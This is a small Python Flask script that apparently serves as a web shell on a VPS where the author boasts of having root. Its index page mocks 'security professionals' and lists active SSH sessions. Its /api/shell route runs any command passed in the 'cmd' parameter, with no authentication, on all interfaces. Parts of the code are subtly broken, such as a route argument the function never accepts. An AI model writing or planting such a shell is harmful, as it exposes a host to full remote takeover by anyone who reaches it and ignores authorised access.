from flask import Flask, request
import subprocess

app=Flask(__name__)

@app.route('/')
def lol():
  return f"<p>i love the initiative but me having root access to any system, even if it's a VPS is funny. Probably was intended but still come on security professionals.<br>Active SSH connections<br></p><center>{subprocess.check_output(['w'])}</center>"
  
@app.route('/api/shell/<command>')
def shell():
    try:
        request.args.cmd
        return f"{subprocess.check_output(request.args.get('cmd').split())}"
    except:
        return "use cmd parameter to execute commands"



app.run(host="0.0.0.0", port=69)
